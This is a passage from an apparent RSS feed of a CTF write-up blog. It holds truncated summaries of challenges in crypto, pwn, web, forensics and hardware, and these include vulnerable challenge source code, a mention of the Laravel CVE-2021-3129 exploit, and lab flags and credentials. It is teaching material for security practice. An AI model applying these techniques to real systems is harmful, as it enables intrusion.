$ cat output.txt b71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8O If we run the JAR file, we have a different output:
$ java -jar stream.jar 3b13O3183Oe4Od2O3b13O3183Oe4Od2O3b13O3183Oe4Od2O3b13O3183Oe4Od2O3b13O3183Oe4Od2O Java decompilation We will need to decompile the JAR file and obtain a readable Java source file. We can go to www.javadecompilers.com and select CFR as decompiler. Then, we will have this source code:
/* * Decompiled with CFR 0.150. */ import java.</description></item><item><title>Ursa Minor</title><link>https://7rocky.github.io/en/ctf/other/blackhat-ctf/ursa-minor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/blackhat-ctf/ursa-minor/</guid><description>We are given the following source code and an instance to connect to:
#!/usr/local/bin/python # # Polymero # # Imports from Crypto.Util.number import isPrime, getPrime, inverse import hashlib, time, os # Local import FLAG = os.environ.get('FLAG').encode() class URSA: # Upgraded RSA (faster and with cheap key cycling) def __init__(self, pbit, lbit): p, q = self.prime_gen(pbit, lbit) self.public = {'n': p * q, 'e': 0x10001} self.private = {'p': p, 'q': q, 'f': (p - 1)*(q - 1), 'd': inverse(self.</description></item><item><title>Userland City</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/userland-city/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/userland-city/</guid><description>We are provided with this webpage:
Enumeration It shows a login form. Fortunately, we are given credentials in the challenge description: lxkid02:8rsNN9ohfLp69cVRFEgk4Qzs. Hence, we can use them to access:
It is a simple web page for some fake online store for cybercriminals.
The description of the challenge is quite long. The important things are the already used credentials and that it uses Laravel with debug mode activated.
Finding a CVE There is a known exploit for Laravel when debug is on: CVE-2021-3129.</description></item><item><title>Valhalloween</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/valhalloween/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/valhalloween/</guid><description>We are given these files:
$ tree Logs Logs ├── Application.evtx ├── DebugChannel.etl ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-AppV-Client%4Admin.evtx ├── Microsoft-AppV-Client%4Operational.evtx ├── Microsoft-AppV-Client%4Virtual Applications.evtx ├── Microsoft-Client-License-Flexible-Platform%4Admin.evtx ├── Microsoft-Client-Licensing-Platform%4Admin.evtx ... ├── Microsoft-Windows-Workplace Join%4Admin.evtx ├── Microsoft-WindowsPhone-Connectivity-WiFiConnSvc-Channel.evtx ├── OAlerts.evtx ├── OpenSSH%4Admin.evtx ├── OpenSSH%4Operational.evtx ├── Parameters.evtx ├── SMSApi.evtx ├── Security.evtx ├── Setup.evtx ├── State.evtx ├── System.evtx └── Windows PowerShell.evtx 1 directory, 366 files These are EVTX files that stand for Windows event logs.</description></item><item><title>Vault-breaker</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/vault-breaker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/vault-breaker/</guid><description>We have a 64-bit binary called vault-breaker:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/' If we execute it, we have two options:
$ ./vault-breaker Current status: Unlocked 🔓 ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓▓▓▒▒▒▒▒▒░░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒░░▒▒░░████▓▓████░░▒▒▓▓▓▓▓▓▓▓▓▓░░▒▒░░ ░░░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓░░▓▓▒▒▒▒▒▒░░░░▒▒▓▓██▒▒▒▒▓▓▓▓▓▓░░░░ ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒▓▓░░▓▓░░██▓▓▓▓▓▓▒▒▒▒██░░▓▓▓▓▒▒▒▒ ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░▓▓▒▒░░▒▒██░░██▒▒▒▒▒▒▒▒██▒▒▒▒██▓▓▒▒▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▒▒▓▓▒▒▓▓░░▒▒▓▓▒▒▒▒░░░░░░▒▒██░░██▒▒▒▒ ▒▒▒▒▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒░░░░▓▓▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▓▓▓▓▓▓▒▒ ░░▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▒▒▒▒▒▒▓▓░░▓▓░░░░░░░░▒▒▒▒██▒▒██▒▒ ▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▓▓▒▒░░▒▒▓▓░░░░░░░░░░▒▒▒▒▓▓▒▒██░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▓▓▒▒░░▒▒▓▓░░▒▒░░░░░░░░░░▓▓▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▒▒▒▒▒▒▓▓▒▒░░░░░░░░░░░░▒▒▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▒▒▒▒░░▓▓▒▒░░░░▒▒░░▒▒▒▒▓▓▒▒▓▓░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▓▓▒▒▓▓░░░░░░▒▒░░▒▒▓▓▓▓██▒▒ ░░▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓██▒▒░░▒▒▒▒▓▓▒▒░░░░▒▒▒▒▓▓▓▓▒▒░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓██▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒░░▓▓▒▒▒▒▒▒▓▓▒▒██▒▒▓▓▓▓░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▓▒▒██▒▒░░▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓░░░░ ░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓██▓▓████▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░░░░░░░ ░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓██▒▒▓▓▒▒▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ [+] Random secure encryption key has been generated!</description></item><item><title>Vigenère Cipher</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/vigenere-cipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/vigenere-cipher/</guid><description>We are given this ciphertext:
DETctysy{QzeffcgRgcBhsjdkf} And we also have a strange word: blorpy.
Since the challenge is called &amp;ldquo;Vigenère Cipher&amp;rdquo;, we can guess that the encryption algorithm is precisely Vigenère cipher, which is a type of Caesar substitution algorithm. To decrypt the message, we can go to CyberChef and use blorpy as key:
Flag: CTFlearn{CiphersAreAwesome}.</description></item><item><title>Vitrium Stash</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/vitrium-stash/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/vitrium-stash/</guid><description>We are given the Python source code of the server:
from Crypto.Util.number import * from secrets import * import json """ from Crypto.PublicKey import DSA k = DSA.generate(2048) print(f"{k.p = }") print(f"{k.q = }") print(f"{k.g = }") """ p = 30514860220781649196505378618677588344627509796136052197766721133333403517227804826248671926331671978511695325934422209350872533631963158343821543243314354301612941382823755283391175569282500778759917825290265500008435125458284371701669393617263164707568562478942069967845682300866897274415749964510071038555145487346022921591488265881313448995313340365972250251431925090356830155846705412769705029295847471355919584592321591959772488755986181054597974081870037624260173234561447688627353479361867003340196122160639547860024025674714107946196423198018724048310862485718766310003158603549746994074302705926658218700843 q = 26189572440233739420990528170531051459310363621928135990243626537967 g = 6111748161621056558453263711027460170929636824002846224800107291166700007147256826554286465237732729099376511591848799483754962591483370638607627034808201246023891469880792589537431156477847873086973414247654773443349132863425799271140168302068820170758172107172379842519843597077356839020025609506792115532019927453283319270046204956352057936972814681479252626295814756888943630138110534869191473166355939365725603055249365076889191708484425425599800051451167006426087674425090967640170968963795028092131692666710522291627118158125917935888441403300632869010691598781782043810771106247022549721544793735832383283054 x = randbelow(p) y = pow(g, x, p) def sign(message): m = bytes_to_long(message) k = randbelow(p) r = pow(g, k, p) % q s = (inverse(k, q) * (m + x*r)) % q return r, s def verify(message, r, s): assert 0 &amp;lt; r &amp;lt; q assert 0 &amp;lt; s &amp;lt; q m = bytes_to_long(message) w = pow(s, -1, q) u1 = (m * w) % q u2 = (r * w) % q v = ((pow(g, u1, p) * pow(y, u2, p)) % p) % q return r == v menu = "</description></item><item><title>Void</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/void/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/void/</guid><description>We are given a 64-bit binary called void:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Reverse engineering If we use Ghidra, we will find this decompiled C code:
void vuln() { char data[64]; read(0, data, 200); } int main() { vuln(); return 0; } The code is very short and there is only a single point to enter data.</description></item><item><title>Void</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/void/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/void/</guid><description>We are given a 64-bit binary called void:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Reverse engineering If we use Ghidra, we will find this decompiled C code:
void vuln() { char data[64]; read(0, data, 200); } int main() { vuln(); return 0; } The code is very short and there is only a single point to enter data.</description></item><item><title>Waiting List</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/waiting-list/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/waiting-list/</guid><description>We are provided with the server source code in Python (challenge.py):
import json import signal import subprocess import socketserver from hashlib import sha1 from random import randint from Crypto.Util.number import bytes_to_long, long_to_bytes FLAG = 'HTB{dummyflag}' class ECDSA: def __init__(self): self.n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 self.k = 0 self.g = 5 self.key = ... #choose your own key def sign(self, pt): h = sha1(pt).digest() h = bytes_to_long(h) h = bin(h)[2:] h = int(h[:len(bin(self.n)[2:])], 2) self.</description></item><item><title>Walkie Hackie</title><link>https://7rocky.github.io/en/ctf/htb-challenges/hardware/walkie-hackie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/hardware/walkie-hackie/</guid><description>We are given four radiofrequency signal captures (1.complex to 4.complex) and a website to test codes:
Moreover, this is the description of the challenge:
Our agents got caught during a mission and found that the guards are using old walkie-talkies for their communication. The field team captured their transmissions. Can you interrupt their communication to help our agents escape from the guards?
Radiofrequency analysis Although there is a hint in the HTML source code of the website pointing to Universal Radio Hacker, I prefer using inspectrum.</description></item><item><title>Watch Tower</title><link>https://7rocky.github.io/en/ctf/htb-challenges/hardware/watch-tower/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/hardware/watch-tower/</guid><description>We are told that someone has been collecting and altering information in the network. Plus, we are given a file called tower_logs.pcapng.
Network traffic analysis If we open the PCAP file in Wireshark, we will see a lot of Modbus packets:
Modbus One thing to notice is the function code. There are three function codes involved in this trace (more information in Wikipedia):
Write Multiple Coils Read Coil Write Multiple Registers The one that looks relevant is Write Multiple Registers because there are only 2 packets with Write Multiple Coils and Read Coil packets do not seem to hold any data.</description></item><item><title>Watersnake</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/watersnake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/watersnake/</guid><description>We are given a website like this:
We also have the source code in Java (SpringBoot).
Source code analysis This is the main application file (Application.java):
package com.lean.watersnake; import java.util.Arrays; import org.springframework.boot.CommandLineRunner; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.ApplicationContext; @SpringBootApplication public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } } We can find the available endpoints at Controller.java:
package com.lean.watersnake; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.</description></item><item><title>Weak RSA</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/weak-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/weak-rsa/</guid><description>We are given a public key in PEM format for an RSA implementation (key.pub):
-----BEGIN PUBLIC KEY----- MIIBHzANBgkqhkiG9w0BAQEFAAOCAQwAMIIBBwKBgQMwO3kPsUnaNAbUlaubn7ip 4pNEXjvUOxjvLwUhtybr6Ng4undLtSQPCPf7ygoUKh1KYeqXMpTmhKjRos3xioTy 23CZuOl3WIsLiRKSVYyqBc9d8rxjNMXuUIOiNO38ealcR4p44zfHI66INPuKmTG3 RQP/6p5hv1PYcWmErEeDewKBgGEXxgRIsTlFGrW2C2JXoSvakMCWD60eAH0W2PpD qlqqOFD8JA5UFK0roQkOjhLWSVu8c6DLpWJQQlXHPqP702qIg/gx2o0bm4EzrCEJ 4gYo6Ax+U7q6TOWhQpiBHnC0ojE8kUoqMhfALpUaruTJ6zmj8IA1e1M6bMqVF8sr lb/N -----END PUBLIC KEY----- $ python3 -q &amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA &amp;gt;&amp;gt;&amp;gt; key = RSA.import_key(open('key.pub').read()) &amp;gt;&amp;gt;&amp;gt; key.n 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 &amp;gt;&amp;gt;&amp;gt; key.e 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605 RSA works as follows: We take two large primes $p$ and $q$ and set the modulus $n = pq$. Then we choose an exponent $e$ (typically $e = 65537$) and encrypt a message $m$ in decimal format:</description></item><item><title>Web3</title><link>https://7rocky.github.io/en/ctf/other/balsn-ctf/web3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/balsn-ctf/web3/</guid><description>We are given a Node.js application that uses Web3:
const express = require("express"); const ethers = require("ethers"); const path = require("path"); const app = express(); app.use(express.urlencoded()); app.use(express.json()); app.get("/", function(_req, res) { res.sendFile(path.join(__dirname + "/server.js")); }); function isValidData(data) { if (/^0x[0-9a-fA-F]+$/.test(data)) { return true; } return false; } app.post("/exploit", async function(req, res) { try { const message = req.body.message; const signature = req.body.signature; if (!isValidData(signature) || isValidData(message)) { res.send("wrong data"); return; } const signerAddr = ethers.</description></item><item><title>what's a net cat?</title><link>https://7rocky.github.io/en/ctf/picoctf/general-skills/whats-a-net-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/general-skills/whats-a-net-cat/</guid><description>We are given a remote instance to connect to. If we stablish the connection with nc, we get the flag:
$ nc jupiter.challenges.picoctf.org 25103 You're on your way to becoming the net cat master picoCTF{nEtCat_Mast3ry_d0c64587}</description></item><item><title>where are the robots</title><link>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/where-are-the-robots/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/where-are-the-robots/</guid><description>We are given a website like this:
The page talks about robots. There is a special file called robots.txt that prevents web crawlers and spiders to access some routes listed on the file. Let&amp;rsquo;s take a look:
Alright, there is a Disallow: /8028f.html, which does not mean that we cannot enter (it only tells automatic scanners not to enter). This is /8028f.html:
And there&amp;rsquo;s the flag:
picoCTF{ca1cu1at1ng_Mach1n3s_8028f}</description></item><item><title>Whole Lotta Candy</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/whole-lotta-candy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/whole-lotta-candy/</guid><description>We got the Python source code of the server:
from encrypt import Encryptor from secret import FLAG import socketserver import random import signal import json MODES = ['ECB', 'CBC', 'CFB', 'OFB', 'CTR'] class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def main(s): mode = random.choice(MODES) enc = Encryptor() while True: try: sendMessage(s, f"Please interact with the server using json data!</description></item><item><title>Whole Lotta Candy</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/whole-lotta-candy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/whole-lotta-candy/</guid><description>We got the Python source code of the server:
from encrypt import Encryptor from secret import FLAG import socketserver import random import signal import json MODES = ['ECB', 'CBC', 'CFB', 'OFB', 'CTR'] class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def main(s): mode = random.choice(MODES) enc = Encryptor() while True: try: sendMessage(s, f"Please interact with the server using json data!</description></item><item><title>WIDE</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/wide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/wide/</guid><description>We are given a 64-bit binary file called wide and another file called db.ex with some strings:
$ file wide wide: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=13869bb7ce2c22f474b95ba21c9d7e9ff74ecc3f, not stripped $ strings db.ex Primus people breathe variety practice Our home dimension Cheagaz scene control river importance The Ice Dimension Byenoovia fighting cast it parallel The Berserk Dimension Cloteprea facing motor unusual heavy The Hungry Dimension Maraqa stomach motion sale valuable The Water Dimension Aidor feathers stream sides gate The Bone Dimension Flaggle Alpha admin secret power hidden HOt* 0ANe If we run the binary we have this:</description></item><item><title>Wild Goose Hunt</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/wild-goose-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/wild-goose-hunt/</guid><description>We are given this website:
We are also given the source code of the project in Node.js (Express).
Source code analysis This is index.js:
const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const routes = require('./routes'); const mongoose = require('mongoose'); mongoose.connect('mongodb://localhost:27017/heros', { useNewUrlParser: true , useUnifiedTopology: true }); app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: true })); app.use(express.static('static')); app.set('view engine', 'pug'); app.use(routes); app.all('*', (req, res) =&amp;gt; { return res.status(404).send({ message: '404 page not found' }); }); app.</description></item><item><title>winter</title><link>https://7rocky.github.io/en/ctf/other/dicectf/winter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/dicectf/winter/</guid><description>We are given the Python source code of a server:
#!/usr/local/bin/python import os from hashlib import sha256 class Wots: def __init__(self, sk, vk): self.sk = sk self.vk = vk @classmethod def keygen(cls): sk = [os.urandom(32) for _ in range(32)] vk = [cls.hash(x, 256) for x in sk] return cls(sk, vk) @classmethod def hash(cls, x, n): for _ in range(n): x = sha256(x).digest() return x def sign(self, msg): m = self.hash(msg, 1) sig = b''.</description></item><item><title>WOTS Up</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/wots-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/wots-up/</guid><description>With the need to find post-quantum schemes, hash-based signatures are cool again.
Challenge contributed by CryptoHack
Challenge files:
data.json chal.py We are given a class called Winternitz that implements some sort of signing protocol based on SHA256 hashes. Actually, WOTS stands for Winternitz One-Time Signature and it is a post-quantum signature algorithm, which is perfectly explained at www.codingninjas.com.
Source code analysis First of all, the class creates a list of private keys:</description></item><item><title>WOTS Up 2</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/wots-up-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/wots-up-2/</guid><description>I fixed the problem with my last scheme, now I can confidently sign my WOTScoin transactions.
Challenge contributed by CryptoHack
Challenge files:
data.json chal.py This is another challenge that implements WOTS (more information at www.codingninjas.com).
Source code analysis The Winternitz class is a bit different from the first part of the challenge, in the keys generation:
class Winternitz: def __init__(self): self.priv_key = [] for _ in range(KEY_LEN): priv_seed = urandom(KEY_LEN) self.</description></item><item><title>WOW... So Meta</title><link>https://7rocky.github.io/en/ctf/ctflearn/forensics/wow...-so-meta/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/forensics/wow...-so-meta/</guid><description>We are told to find the flag in this image:
However, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file metadata.
We can use exiftool to extract the file metadata and then filter by CTFlearn using grep:
